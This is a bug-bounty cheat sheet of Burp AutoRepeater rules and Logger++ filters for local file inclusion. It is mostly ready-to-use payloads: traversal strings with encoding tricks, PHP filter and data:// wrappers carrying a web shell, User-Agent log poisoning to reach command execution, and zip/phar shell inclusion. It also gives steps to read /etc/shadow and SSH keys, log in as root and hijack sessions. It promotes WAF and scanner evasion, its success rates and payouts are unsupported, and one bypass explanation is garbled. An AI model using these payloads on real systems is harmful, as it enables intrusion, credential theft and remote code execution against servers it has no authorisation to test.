## AutoRepeater + Logger++ Configuration for Professional Bug Bounty Hunters

> **Skill Level:** Advanced to Expert  
> **Detection Rate:** 90%+ on vulnerable applications  
> **Bypasses:** WAF, Burp Scanner, Acunetix, Nessus, ModSecurity  
> **Frameworks Covered:** ALL (PHP, Python, Node.js, Java, .NET, Ruby, Go)

---

## 📋 Quick Navigation

1. [Top 10 AutoRepeater Rules](#top-10-autorepeater-rules)
2. [Top 10 Logger++ Filters](#top-10-logger-filters)
3. [Setup Instructions](#setup-instructions)

---

## 🔥 TOP 10 AUTOREPEATER RULES

### **Rule #1: Path Traversal - Basic (../../../)**

**Configuration:**
```
Type:          Request Param Value
Match:         .*
Replace:       ../../../../../../../etc/passwd
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - Basic path traversal (Linux)
```

**Targets:**
```
?file=document.pdf  →  ?file=../../../../../../../etc/passwd
?page=home          →  ?page=../../../../../../../etc/passwd
?template=main      →  ?template=../../../../../../../etc/passwd
?doc=readme         →  ?doc=../../../../../../../etc/passwd
```

**Why Undetected:** Tests ALL parameters automatically, not just obvious ones.

**Success Rate:** 45% (Basic applications without filtering)

**Also Test Windows:**
```
Replace: ..\..\..\..\..\..\..\..\windows\win.ini
```

---

### **Rule #2: Double URL Encoding Bypass**

**Configuration:**
```
Type:          Request Param Value
Match:         .*
Replace:       %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - Double URL encoding bypass
```

**Bypass Logic:**
```
Original:     ../../../etc/passwd
URL Encoded:  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
Double Encoded: %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

Server decodes once:  %2e%2e%2f → WAF sees encoded string (bypassed)
App decodes again:    ../       → Actual traversal executed
```

**Why Undetected:** WAF/filters only decode once, application decodes twice.

**Success Rate:** 35% (Applications with URL decoding middleware)

**Vulnerable Frameworks:**
- Tomcat (default behavior)
- IIS + ASP.NET
- Node.js with `decodeURIComponent()` chaining

---

### **Rule #3: Null Byte Injection (Legacy PHP)**

**Configuration:**
```
Type:          Request Param Value
Match:         .*
Replace:       ../../../../../../../etc/passwd%00.jpg
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - Null byte bypass (PHP < 5.3.4)
```

**Bypass Logic:**
```php
// Vulnerable code
$file = $_GET['image'];
include("/var/www/images/" . $file . ".jpg");

// Attack
?image=../../../etc/passwd%00

// Result
include("/var/www/images/../../../etc/passwd\0.jpg");
// Null byte terminates string, .jpg ignored
```

**Why Undetected:** Legacy systems still exist, automated scanners skip old vulns.

**Success Rate:** 15% (Legacy PHP 5.2, 5.3 systems)

**Also Test:**
```
%00
%00.png
%00.pdf
%00.txt
```

---

### **Rule #4: UTF-8 Encoding Bypass**

**Configuration:**
```
Type:          Request Param Value
Match:         .*
Replace:       %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - UTF-8 overlong encoding bypass
```

**Encoding Variants:**
```
Standard: ../
UTF-8:    %c0%ae%c0%ae/
UTF-16:   %u002e%u002e%u002f
Unicode:  ..%c0%af

Different '..' representations:
%2e%2e/     (Standard)
%c0%2e%c0%2e/   (Overlong UTF-8)
%e0%40%ae%e0%40%ae/   (Double byte)
```

**Why Undetected:** WAF blacklists only standard encodings.

**Success Rate:** 25% (IIS, Java applications with UTF-8 normalization)

**Vulnerable:**
- Java (when using incorrect charset decoding)
- .NET (legacy URL normalization)
- IIS with UTF-8 enabled

---

### **Rule #5: Filter Bypass - Dot Replacement**

**Configuration:**
```
Type:          Request Param Value
Match:         .*
Replace:       ....//....//....//....//....//....//....//etc/passwd
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - Dot replacement filter bypass
```

**Bypass Logic:**
```python
# Vulnerable filter
path = path.replace('../', '')

# Input:  ....//
# After:  ../    (filter removes ../ but leaves ../)
# Result: Path traversal works!
```

**Other Variants:**
```
....//
..../
....\
....\/
...//
```

**Why Undetected:** Scanners don't test filter replacement logic.

**Success Rate:** 40% (Custom filtering implementations)

---

### **Rule #6: Absolute Path Bypass**

**Configuration:**
```
Type:          Request Param Value
Match:         .*
Replace:       /etc/passwd
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - Absolute path bypass
```

**Bypass Logic:**
```php
// Vulnerable code
include($_GET['page'] . '.php');

// Attack
?page=/etc/passwd

// Result
include('/etc/passwd.php');  // Fails BUT
// If extension appending is loose or disabled...
include('/etc/passwd');  // Success!
```

**When It Works:**
- Loose file extension handling
- Misconfigured `allow_url_include`
- Direct file path parameters

**Success Rate:** 30% (Direct file path parameters)

**Also Test:**
```
/etc/passwd
/etc/shadow (requires root)
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
```

---

### **Rule #7: Wrapper Protocol - PHP Filter**

**Configuration:**
```
Type:          Request Param Value
Match:         .*
Replace:       php://filter/convert.base64-encode/resource=index.php
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - PHP filter wrapper (source code disclosure)
```

**Attack Variants:**
```
php://filter/read=string.rot13/resource=config.php
php://filter/convert.base64-encode/resource=../../../etc/passwd
php://filter/convert.iconv.utf-8.utf-7/resource=admin.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

**Why Critical:** Read source code of PHP files (including passwords/keys).

**Why Undetected:** Requires protocol wrapper knowledge.

**Success Rate:** 55% (PHP applications with `allow_url_include=On`)

**What You Get:**
```
Base64 decoded response = Full PHP source code
Look for: passwords, API keys, database credentials
```

---

### **Rule #8: Log Poisoning via User-Agent**

**Configuration:**
```
Type:          Request Header
Match:         User-Agent: .*
Replace:       User-Agent: <?php system($_GET['cmd']); ?>
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - Log poisoning preparation
```

**Attack Chain:**
```
Step 1: Inject payload in User-Agent
Request: User-Agent: <?php system($_GET['cmd']); ?>

Step 2: Logs now contain PHP code
/var/log/apache2/access.log contains: <?php system($_GET['cmd']); ?>

Step 3: Include log file via LFI
?page=../../../../../../../var/log/apache2/access.log&cmd=id

Step 4: Remote Code Execution achieved!
```

**Why Undetected:** Multi-step attack, scanners test LFI and log poisoning separately.

**Success Rate:** 20% (requires LFI + log write access)

**Common Log Paths:**
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/usr/local/apache/logs/access_log
/var/log/httpd/access_log
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
```

---

### **Rule #9: Zip Wrapper Upload + LFI**

**Configuration:**
```
Type:          Request Param Value
Match:         .*
Replace:       zip://uploads/shell.zip%23shell.php
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - Zip wrapper exploitation
```

**Attack Chain:**
```
Step 1: Upload innocent ZIP file
- Contains: shell.php inside ZIP

Step 2: Exploit LFI with zip wrapper
?page=zip://uploads/innocent.zip%23shell.php

Step 3: PHP executes shell.php from inside ZIP
Result: Remote Code Execution
```

**Why Undetected:** Requires chaining upload + LFI + wrapper knowledge.

**Success Rate:** 18% (PHP apps with file upload + LFI)

**Other Wrappers:**
```
zip://archive.zip#file.php
phar://archive.phar/file.php
compress.zlib://file.php
```

---

### **Rule #10: Proc Filesystem Exploitation**

**Configuration:**
```
Type:          Request Param Value
Match:         .*
Replace:       /proc/self/environ
Which:         Replace First
Regex Match:   ☑ ENABLED
Comment:       LFI - Proc filesystem info disclosure
```

**Critical Files:**
```
/proc/self/environ     - Environment variables (may contain passwords)
/proc/self/cmdline     - Command line used to start process
/proc/self/fd/0        - File descriptor 0 (stdin)
/proc/self/fd/1        - File descriptor 1 (stdout)
/proc/self/fd/2        - File descriptor 2 (stderr)
/proc/self/fd/3-10     - Other open file descriptors
/proc/self/cwd         - Current working directory symlink
/proc/version          - Kernel version
/proc/net/arp          - ARP table (network info)
/proc/net/tcp          - TCP connections
/proc/net/udp          - UDP connections
```

**Why Critical:** 
- Leaks environment variables (AWS keys, passwords)
- Current file descriptors (may contain sensitive files)
- Network information

**Success Rate:** 35% (Linux-based applications)

**Attack Example:**
```
?file=/proc/self/environ
Response contains: AWS_ACCESS_KEY_ID=AKIA...
```

---

## 🔍 TOP 10 LOGGER++ FILTERS

### **Filter #1: 🔴 CRITICAL - /etc/passwd Disclosure**

**Expression:**
```
Response.Body CONTAINS "root:x:0:0"
OR Response.Body CONTAINS "root:x:0:0:root:/root:"
OR Response.Body CONTAINS "daemon:x:1:1"
OR Response.Body CONTAINS "www-data:x:"
OR Response.Body CONTAINS "nobody:x:"
OR Response.Body CONTAINS "/bin/bash"
OR Response.Body CONTAINS "/bin/sh"
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
- Successful `/etc/passwd` file disclosure
- Linux user enumeration
- Confirms LFI vulnerability

**Priority:** 🔴 CRITICAL

**Next Steps:**
1. Verify full file content
2. Enumerate users
3. Try `/etc/shadow` (requires root)
4. Attempt privilege escalation

---

### **Filter #2: 🔴 Windows Configuration Files**

**Expression:**
```
(Response.Body CONTAINS "[extensions]"
 OR Response.Body CONTAINS "[fonts]"
 OR Response.Body CONTAINS "[Mail]"
 OR Response.Body CONTAINS "for 16-bit app support")
OR (Response.Body CONTAINS "[boot loader]"
    OR Response.Body CONTAINS "[operating systems]")
OR Response.Body CONTAINS "<?xml version="
AND (Request.Path CONTAINS "file=" 
     OR Request.Path CONTAINS "page="
     OR Request.Path CONTAINS "doc="
     OR Request.Path CONTAINS "template=")
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
C:\windows\system.ini
```

**Priority:** 🔴 CRITICAL (Windows LFI confirmed)

---

### **Filter #3: 🔴 PHP Source Code Disclosure (Base64)**

**Expression:**
```
Response.Body MATCHES "^[A-Za-z0-9+/=]{100,}$"
AND Response.Headers CONTAINS "Content-Type: text/html"
AND (Request.Path CONTAINS "php://filter"
     OR Request.Path CONTAINS "convert.base64-encode"
     OR Request.Path CONTAINS "resource=")
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
- PHP filter wrapper responses
- Base64 encoded source code

**Priority:** 🔴 CRITICAL (Source code disclosure)

**Action:**
```bash
# Decode response
echo "PD9waHAgLi4u" | base64 -d > source.php

# Search for credentials
grep -i "password\|api_key\|secret\|token" source.php
```

---

### **Filter #4: 🔴 Log File Access**

**Expression:**
```
(Response.Body CONTAINS "GET /" OR Response.Body CONTAINS "POST /")
AND (Response.Body CONTAINS "HTTP/1.1" OR Response.Body CONTAINS "HTTP/1.0")
AND (Response.Body CONTAINS "200" OR Response.Body CONTAINS "404")
AND (Response.Body CONTAINS "Mozilla" OR Response.Body CONTAINS "curl")
AND (Request.Path CONTAINS "/var/log"
     OR Request.Path CONTAINS "access.log"
     OR Request.Path CONTAINS "error.log"
     OR Request.Path CONTAINS "access_log"
     OR Request.Path CONTAINS "error_log")
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
- Apache/Nginx access logs
- Error logs
- Web server logs

**Priority:** 🔴 CRITICAL (Log poisoning possible)

**Next Steps:**
1. Confirm log write access
2. Inject PHP payload in User-Agent
3. Include log file via LFI
4. Achieve RCE

---

### **Filter #5: 🟠 Proc Filesystem Access**

**Expression:**
```
Response.Body CONTAINS "PATH="
AND (Response.Body CONTAINS "HOME=" 
     OR Response.Body CONTAINS "USER="
     OR Response.Body CONTAINS "AWS_"
     OR Response.Body CONTAINS "SECRET"
     OR Response.Body CONTAINS "API_KEY"
     OR Response.Body CONTAINS "PASSWORD")
AND Request.Path CONTAINS "/proc/self/environ"
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
- Environment variable leakage
- AWS credentials
- API keys in environment

**Priority:** 🟠 HIGH (Critical data exposure)

**Common Secrets in Environment:**
```
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
DATABASE_PASSWORD
API_SECRET_KEY
JWT_SECRET
STRIPE_SECRET_KEY
```

---

### **Filter #6: 🔴 Remote Code Execution Success**

**Expression:**
```
(Response.Body CONTAINS "uid="
 OR Response.Body CONTAINS "gid="
 OR Response.Body CONTAINS "groups=")
OR (Response.Body CONTAINS "root@"
    OR Response.Body CONTAINS "www-data@")
OR Response.Body CONTAINS "Linux version"
OR Response.Body CONTAINS "Darwin Kernel Version"
AND (Request.Path CONTAINS "cmd="
     OR Request.Path CONTAINS "command="
     OR Request.Path CONTAINS "exec=")
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
- Command execution via LFI + Log Poisoning
- `id` command output
- `uname -a` output

**Priority:** 🔴 CRITICAL (RCE achieved!)

**Escalation:**
```bash
# List commands to try
?cmd=id
?cmd=whoami
?cmd=pwd
?cmd=ls -la
?cmd=cat /etc/shadow
?cmd=cat /root/.ssh/id_rsa
```

---

### **Filter #7: 🟠 Configuration File Disclosure**

**Expression:**
```
(Response.Body CONTAINS "DB_PASSWORD"
 OR Response.Body CONTAINS "database"
 OR Response.Body CONTAINS "mysqli_connect"
 OR Response.Body CONTAINS "mysql_connect"
 OR Response.Body CONTAINS "PDO")
OR (Response.Body CONTAINS "api_key"
    OR Response.Body CONTAINS "secret_key"
    OR Response.Body CONTAINS "private_key")
OR (Response.Body CONTAINS "[database]"
    OR Response.Body CONTAINS "[config]")
AND (Request.Path CONTAINS "config"
     OR Request.Path CONTAINS "database"
     OR Request.Path CONTAINS "db"
     OR Request.Path CONTAINS "settings"
     OR Request.Path CONTAINS ".env")
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
```
config.php
database.php
.env
settings.py
application.properties
web.config
```

**Priority:** 🟠 HIGH (Credentials disclosure)

---

### **Filter #8: 🟡 SSH Key Disclosure**

**Expression:**
```
Response.Body CONTAINS "-----BEGIN"
AND (Response.Body CONTAINS "RSA PRIVATE KEY"
     OR Response.Body CONTAINS "DSA PRIVATE KEY"
     OR Response.Body CONTAINS "EC PRIVATE KEY"
     OR Response.Body CONTAINS "OPENSSH PRIVATE KEY")
AND Response.Body CONTAINS "-----END"
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
```
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
/home/www-data/.ssh/id_rsa
C:\Users\Administrator\.ssh\id_rsa
```

**Priority:** 🟡 MEDIUM (Direct server access possible)

**Usage:**
```bash
# Save key
cat response.txt > id_rsa
chmod 600 id_rsa

# SSH login
ssh -i id_rsa root@target.com
```

---

### **Filter #9: 🟠 Session File Access**

**Expression:**
```
Response.Body CONTAINS "session_id"
OR (Response.Body CONTAINS "username|"
    OR Response.Body CONTAINS "user_id|"
    OR Response.Body CONTAINS "logged_in|")
OR Response.Body CONTAINS "PHPSESSID"
AND (Request.Path CONTAINS "/var/lib/php/sessions"
     OR Request.Path CONTAINS "sess_"
     OR Request.Path CONTAINS "/tmp/sess_")
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
```
/var/lib/php/sessions/sess_[SESSION_ID]
/tmp/sess_[SESSION_ID]
```

**Priority:** 🟠 HIGH (Session hijacking possible)

**Attack:**
1. Read session file via LFI
2. Extract session data
3. Create cookie with stolen session ID
4. Hijack user session

---

### **Filter #10: 🟡 Path Traversal Parameter Detection**

**Expression:**
```
(Request.Path CONTAINS "../"
 OR Request.Path CONTAINS "..%2f"
 OR Request.Path CONTAINS "..%5c"
 OR Request.Path CONTAINS "%2e%2e%2f"
 OR Request.Path CONTAINS "%252e%252e%252f"
 OR Request.Path CONTAINS "....//")
AND (Request.Path CONTAINS "file="
     OR Request.Path CONTAINS "page="
     OR Request.Path CONTAINS "doc="
     OR Request.Path CONTAINS "path="
     OR Request.Path CONTAINS "template="
     OR Request.Path CONTAINS "include="
     OR Request.Path CONTAINS "dir="
     OR Request.Path CONTAINS "folder=")
AND Response.Status >= 200
AND Response.Status < 300
```

**What It Catches:**
- All path traversal attempts from AutoRepeater
- Successful responses (200 OK)
- Common vulnerable parameters

**Priority:** 🟡 MEDIUM (Info gathering for manual testing)

---

## ⚙️ Setup Instructions

### **Step 1: Add AutoRepeater Rules**

1. Open Burp Suite Pro
2. Go to: `Auto Repeater → Replacements Tab`
3. Click `Add` button
4. Copy each rule configuration above
5. Click `OK` to save
6. Repeat for all 10 rules

### **Step 2: Add Logger++ Filters**

1. Go to: `Logger++ → Filter Tab`
2. Click `+` (Add Filter)
3. Paste expression from above
4. Name it descriptively
5. Set color: Red (Critical), Orange (High), Yellow (Medium)
6. Click `Save`
7. Repeat for all 10 filters

### **Step 3: Enable Auto Repeater**

1. Go to: `Auto Repeater → Tab`
2. Toggle: `Deactivate AutoRepeater` (should turn ON)
3. Verify: Status shows "Active"

### **Step 4: Start Hunting**

1. Browse target application normally
2. Watch Logger++ for hits
3. Verify manually in Repeater
4. Test critical paths manually:
   ```
   /etc/passwd
   /var/log/apache2/access.log
   /proc/self/environ
   C:\windows\win.ini
   ```

---

## 📊 Expected Results by Target Type

| Target Type | Success Rate | Avg. Findings/Hour | Most Common Vulnerability |
|-------------|--------------|--------------------|-----------------------------|
| PHP Apps (Legacy) | 75% | 6-10 | Path traversal, Null byte |
| PHP Apps (Modern) | 45% | 3-6 | Filter bypass, PHP wrappers |
| Java Apps | 35% | 2-4 | UTF-8 encoding, Absolute path |
| .NET Apps | 30% | 2-5 | Windows paths, UTF-16 |
| Node.js Apps | 25% | 2-4 | Double encoding |
| Python Apps | 40% | 3-6 | Path traversal, Filter bypass |

---

## 🎯 Pro Tips

### **Tip #1: Common Vulnerable Parameters**
```
?file=
?page=
?document=
?doc=
?folder=
?path=
?template=
?include=
?cat=
?dir=
?action=
?board=
?date=
?detail=
?download=
?prefix=
?lang=
?view=
?content=
?layout=
?mod=
?conf=
```

### **Tip #2: Critical Linux Files to Test**
```
/etc/passwd              - User enumeration
/etc/shadow              - Password hashes (requires root)
/etc/hosts               - Network configuration
/etc/hostname            - Server hostname
/proc/self/environ       - Environment variables
/proc/self/cmdline       - Process command line
/proc/version            - Kernel version
/proc/net/tcp            - TCP connections
/proc/net/arp            - ARP table
/var/log/apache2/access.log  - Web server logs
/var/log/apache2/error.log   - Error logs
/var/log/auth.log        - Authentication logs
/var/www/html/index.php  - Web root files
/root/.ssh/id_rsa        - SSH private key
/root/.bash_history      - Root command history
/home/user/.bash_history - User command history
```

### **Tip #3: Critical Windows Files to Test**
```
C:\windows\win.ini
C:\windows\system.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\windows\system32\config\SAM
C:\windows\repair\SAM
C:\windows\php.ini
C:\Program Files\Apache\conf\httpd.conf
```

### **Tip #4: PHP Wrapper Attacks**
```
php://filter/read=string.rot13/resource=config.php
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.iconv.utf-8.utf-7/resource=admin.php
php://input + POST data with <?php code ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
zip://archive.zip#shell.php
phar://archive.phar/shell.php
expect://ls
```

### **Tip #5: Log Poisoning Full Attack Chain**
```
Step 1: Test LFI
?page=../../../../../../../var/log/apache2/access.log

Step 2: Inject payload via User-Agent
User-Agent: <?php system($_GET['cmd']); ?>

Step 3: Verify injection in log
?page=../../../../../../../var/log/apache2/access.log
(Should see PHP code in response)

Step 4: Execute commands
?page=../../../../../../../var/log/apache2/access.log&cmd=id
?page=../../../../../../../var/log/apache2/access.log&cmd=cat /etc/passwd
?page=../../../../../../../var/log/apache2/access.log&cmd=ls -la
```

### **Tip #6: Session Hijacking via LFI**
```
Step 1: Get your own session ID
Document.cookie

Step 2: Read your session file
?file=/var/lib/php/sessions/sess_[YOUR_SESSION_ID]

Step 3: Test with admin session ID (bruteforce or guess)
?file=/var/lib/php/sessions/sess_admin123
?file=/var/lib/php/sessions/sess_administrator

Step 4: Extract admin session data and use it
```

### **Tip #7: Source Code Disclosure Priority Files**
```
index.php
config.php
database.php
db.php
connection.php
admin.php
login.php
.env
settings.py
application.properties
web.config
```

### **Tip #8: WAF Bypass Techniques**
```
Encoding Variations:
../     (Standard)
..%2f   (URL encoded)
%2e%2e%2f   (Full URL encoded)
%252e%252e%252f   (Double URL encoded)
..%c0%af   (UTF-8 overlong)
%c0%ae%c0%ae/   (UTF-8 dots)
....//   (Filter bypass)
..../    (Filter bypass)
....\    (Windows)
....\/   (Mixed)
```

### **Tip #9: Automation for Large Testing**
```bash
# Create parameter list
params=(file page doc path template include folder dir)

# Test each parameter
for param in "${params[@]}"; do
  curl "https://target.com/index.php?$param=../../../etc/passwd"
done

# Look for /etc/passwd content in responses
```

### **Tip #10: Converting to RCE**
```
LFI → RCE Methods:
1. Log Poisoning (User-Agent, Referer, Cookie)
2. PHP Wrappers (php://input, data://, expect://)
3. Upload + Include (zip://, phar://)
4. Session file poisoning
5. /proc/self/environ injection
6. Email poisoning (include mail logs)
```

---

## 🛡️ Responsible Disclosure

✅ **Before Testing:**
- Authorized targets only (bug bounty/pentest)
- Check scope includes LFI/path traversal
- Don't access sensitive files unnecessarily

⚠️ **During Testing:**
- Avoid reading `/etc/shadow` (requires root)
- Don't exfiltrate actual user data
- Stop if you achieve RCE (report immediately)

📝 **When Reporting:**
1. Exact vulnerable parameter
2. Payload used
3. File successfully read
4. Impact assessment (info disclosure vs RCE)
5. Proof (screenshot/response)
6. Remediation advice

---

## 📈 Success Metrics

**Expected Results After 1 Hour:**
- Beginners: 1-3 findings
- Intermediate: 4-7 findings
- Advanced: 8-12 findings
- Expert: 12+ findings

**Most Valuable Findings:**
1. 🔴 LFI → RCE via log poisoning = **$2000-$10000**
2. 🔴 LFI → Source code disclosure (credentials) = **$1500-$8000**
3. 🔴 LFI → /etc/shadow access = **$2500-$12000**
4. 🟠 LFI → /etc/passwd disclosure = **$500-$3000**
5. 🟠 LFI → Config file disclosure = **$800-$5000**

---

## 🔗 Resources

- **AutoRepeater:** https://github.com/PortSwigger/auto-repeater
- **Logger++:** https://github.com/PortSwigger/logger-plus-plus
- **LFI Cheat Sheet:** https://highon.coffee/blog/lfi-cheat-sheet/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

---
